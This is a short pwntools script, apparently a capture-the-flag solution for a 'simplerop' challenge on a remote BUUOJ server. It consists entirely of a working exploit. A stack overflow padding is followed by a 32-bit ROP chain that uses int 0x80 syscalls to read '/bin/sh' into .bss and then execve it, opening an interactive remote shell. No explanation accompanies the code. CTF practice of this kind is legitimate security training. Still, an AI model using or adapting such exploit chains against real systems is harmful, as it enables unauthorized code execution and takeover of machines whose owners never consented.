from pwn import *

#io=process('./simplerop')
io=remote('node3.buuoj.cn',26515)
context.terminal = ['gnome-terminal','-x','sh','-c']

pop_eax_ret=0x080bae06
pop_bcdx_ret=0x0806e850 
int_80=0x0806EEF0
bss=0x80EB010


pl='a'*0x1c+'bbbb'+p32(pop_eax_ret)+p32(3)+p32(pop_bcdx_ret)+p32(8)+p32(bss)+p32(0)+p32(int_80)+p32(pop_eax_ret)+p32(11)+p32(pop_bcdx_ret)+p32(0)+p32(0)+p32(bss)+p32(int_80)


def debug(addr):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

#debug('0x8048E69')
io.sendline(pl)
io.send('/bin/sh')

io.interactive()